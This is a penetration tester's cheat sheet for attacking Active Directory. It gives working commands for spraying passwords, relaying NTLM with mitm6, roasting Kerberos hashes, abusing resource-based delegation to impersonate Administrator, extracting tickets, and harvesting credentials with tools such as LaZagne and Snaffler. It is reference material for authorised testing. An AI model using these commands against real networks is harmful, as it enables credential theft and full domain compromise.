# Active Directory Penetration Testing — Step-by-Step Cheat Sheet

> Command reference and methodology index for internal AD penetration tests.
> Companion command syntax lookup: https://wadcoms.github.io/

---

## 1. Host Reconnaissance and Network Enumeration

**Find active hosts**
```bash
sudo nmap -sn -n --max-retries 1 --max-rate 10 --data-length 24 192.168.1.0/24 -oN hosts
fping -asgq 172.16.7.0/23
```

**Fast scan of a specific host**
```bash
# TCP — full port scan
nmap -p- -Pn -T4 --min-rate 2000 --max-retries 2 -oN open_tcp_ports 10.10.10.10

# UDP
sudo nmap -sU --min-rate=400 --min-parallelism=512 --open -oN open_udp_ports 10.10.10.10
```

---

## 2. DNS Enumeration

Reference: [DNS Attacks and Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/DNS-Attack.md)

---

## 3. VHOST Enumeration

Reference: [VHOST Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Web-Tools/Ffuf.md)

---

## 4. Email and Comment Collector with ReconSpider

Reference: [ReconSpider](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Web_Application/Crawl%20Methods/ReconSpider.md)

---

## 5. Technology Enumeration

```
Retire.js
Wappalyzer
BuiltWith
Shodan
JWT Debugger
ModHeader
SSL Certificate Viewer
HackBar
HackTools
```

---

## 6. Pivoting and Internal Network Discovery

**Metasploit — ping sweep through a session**
```
msf6 > use post/multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep) > set RHOSTS 172.16.5.0/24
msf6 post(multi/gather/ping_sweep) > set SESSION 1
msf6 post(multi/gather/ping_sweep) > run
```

---

## 7. Kerberos Clock Sync

```bash
sudo ntpdate domain.local
```

---

## 8. LDAP Enumeration

Reference: [LDAP Architecture & Queries](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Protocols/LDAP/LDAP-Architecture.md)

---

## 9. SMB Enumeration

Reference: [SMB Protocol Attacks](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/SMB-Attack.md)

---

## 10. LLMNR Poisoning Trigger

Reference: [NTLM Hash Capture Triggers](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR%20Poisining%20Triggers.md)

---

## 11. LLMNR / mDNS / NBT-NS Poisoning

Reference: [LLMNR/mDNS/NBT-NS Poisoning](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)

---

## 12. IPv6 + mitm6 → NTLM Relay

```bash
mitm6 -d domain.com &
ntlmrelayx.py -6 -t smb://<DC_IP> -wh fakewpad -l loot
```

---

## 13. Enumeration with NetExec (NXC)

Reference: [NetExec](https://github.com/Aghalarovf/Penetration-Tester/edit/main/Technical_Notes/Active_Directory/AD-Tools/Netexec.md)

---

## 14. Username Enumeration

```bash
# RID brute-force via NXC
nxc smb dc.sendai.vl -u 'test' -p '' --rid-brute 10000 > nxc_result.txt
cat nxc_result.txt | grep TypeUser | awk '{ print $6}' | cut -d '\' -f 2 > users.txt

# Test users with blank password (catches PASSWORD_MUST_CHANGE accounts)
nxc smb dc.sendai.vl -u users.txt -p ''

# Generate username wordlist from full names
./username-anarchy --input-file /home/sako/Labaratory/hostname

# Enumerate valid usernames via Kerberos
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

---

## 15. Password Spraying

```bash
# Check lockout policy first — always do this before spraying
nxc smb <DC_IP> -u <user> -p <pass> --pass-pol

# Rule: if lockout threshold = 5, attempt max 3 passwords, then wait observation window (~30 min)

# Kerbrute spray with delay
kerbrute passwordspray --dc <DC_IP> -d <domain> users.txt 'Password123!' --delay 1000

# CrackMapExec spray with jitter
crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --no-bruteforce --continue-on-success --jitter 5
```

**Spray Strategy:**
1. Spray all discovered service account passwords against all users
2. Try default credentials per service (Tomcat, Jenkins, MSSQL, etc.)
3. Try seasonal/company-name passwords: `Summer2025!`, `CompanyName2025!`

---

## 16. Writable Object Enumeration

```bash
bloodyAD --host <target-ip> --dns <target-ip> -d checkpoint.htb \
  -u alex.turner -p '<password>' get writable
```

---

## 17. AS-REP Roasting

```bash
python3 GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
```

Reference: [Identify pre-auth-disabled users and capture hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)

---

## 18. Kerberoasting

Reference: [Identify SPN accounts, request TGS tickets, and crack offline](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Kerberoasting.md)

---

## 19. Timeroasting

```bash
# Enumerate and capture
nxc smb dc.rustykey.htb -k -M timeroast

# Crack offline
hashcat -m 31300 time_hashes /usr/share/wordlists/rockyou.txt
```

---

## 20. SID Lookup

```bash
impacket-lookupsid -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb
```

---

## 21. Pre-Windows 2000 Compatible Access (Pre2K)

```bash
# Check if the group has vulnerable computer accounts
nxc ldap <DC_IP> -u pentest -p 'p3nt3st2025!&' -M pre2k

# Obtain TGT using the computer account
kinit 'fs01$'
```

> **Note:** Look for members of the **Pre-Windows 2000 Compatible Access** group — computer accounts in this group may have weak or default passwords.

---

## 22. Delegation Enumeration

```bash
# Find accounts trusted for delegation
nxc ldap dc.sendai.vl -u user -p pass --trusted-for-delegation
nxc ldap dc.sendai.vl -u user -p pass --find-delegation
impacket-findDelegation sendai.vl/user:pass
```

---

## 23. Resource-Based Constrained Delegation (RBCD)

```bash
# Check machine account quota (MAQ)
nxc ldap dc.sendai.vl -u user -p pass -M maq

# Create a fake computer account
impacket-addcomputer sendai.vl/user:pass \
  -computer-name 'FAKE$' -computer-pass 'Pass123!'

# Write RBCD attribute
impacket-rbcd sendai.vl/user:pass \
  -action write -delegate-to TARGET$ \
  -delegate-from FAKE$

# Request service ticket impersonating Administrator
impacket-getST -spn cifs/TARGET.sendai.vl \
  -impersonate Administrator \
  sendai.vl/FAKE$:Pass123!
```

---

## 24. Credential Discovery

Reference: [Username & Password Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Credential%20Harvesting.md)

---

## 25. Data Visualization with BloodHound

Reference: [Data Collection and Visualization](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/BloodHound.md)

---

## 26. Shell / Terminal History

```powershell
# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Bash history (Linux pivot)
cat ~/.bash_history
history
```

---

## 27. Service Account TGT via Delegation (Unconstrained)

```powershell
# Dump TGT for delegation-enabled service accounts
.\Rubeus.exe tgtdeleg /nowrap

# Convert to usable format
nano svc_sql.kirbi.b64
cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi
impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME=svc_sql.ccache

# Request AD CS certificate as that service account
certipy req -u svc_sql -k -no-pass -target DC02.darkzero.ext \
  -ca 'darkzeroext-DC02-CA' -template 'user'
```

---

## 28. Credentialed Enumeration — From Linux

```bash
# User and group enumeration
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# Share enumeration
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

# SMBMap
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 \
  -R 'Department Shares' --dir-only
```

---

## 29. Credentialed Enumeration — From Windows

```powershell
# Snaffler — find credentials in shares and files
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt

# LaZagne — local credential harvesting
.\LaZagne.exe all

# WinPEAS — full local enumeration
.\WinPeas.exe
```

---

## 30. Living off the Land

Reference: [Maximizing information via PowerShell & CMD](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/Living%20Of%20The%20Land.md)

---

## 31. Local Privilege Escalation

Reference: [Windows Privilege Escalation](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Privilege%20Escalation/Windows)

---

## 32. GPO Abuse

Reference: [GPO Abuse Tactics](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/GPO%20Attacks.md)

---

## 33. Active Directory Certificate Services (AD CS)

Reference: [ESC Vulnerabilities and Server Misconfiguration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Certificate%20Services/Vuln%20Enumerate.md)

---

## 34. LAPS Dumping

Reference: [Retrieve LAPS-managed local admin passwords](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/LAPS%20Dumping.md)

---

## 35. DCSync Attack

Reference: [Dump password hashes via DCSync](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/DCSync.md)

---

## 36. SAM / SECURITY / SYSTEM Hive Dumping

Reference: [Dump SAM, SECURITY, and SYSTEM hives for local hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/SAM-SYSTEM-SECURITY%20Dump.md)

---

## 37. LSASS Dumping

Reference: [LSASS memory dump techniques](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LSASS%20Dump.md)

---

## 38. NTDS.dit Dumping

Reference: [Dump domain-wide hashes from NTDS.dit](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTDS%20Dump.md)

---

## 39. Credential Manager / Windows Vault

Reference: [Extract stored credentials from Windows Credential Manager](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Windows%20Credential%20Manager.md)

---

## 40. noPAC + PrintNightmare + PetitPotam

Reference: [Combined exploitation chain](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/BleedingEdge.md)

---

## Attack Chain Summary

```
Recon (Nmap, DNS, VHOST)
    ↓
Unauthenticated Enumeration (LDAP, SMB, RID brute, Kerbrute)
    ↓
Hash Capture (Responder, mitm6, Coercer, PetitPotam)
    ↓
Initial Foothold (Password Spray, AS-REP, Default Creds)
    ↓
Credentialed Enumeration (BloodHound, NXC, Snaffler)
    ↓
Privilege Escalation (Local PrivEsc, GPO, Delegation, AD CS)
    ↓
Credential Harvesting (LSASS, SAM, NTDS, DPAPI, LaZagne)
    ↓
Lateral Movement (Pass-the-Hash, Pass-the-Ticket, WMIExec)
    ↓
Domain Compromise (DCSync, Golden Ticket, RBCD)
```
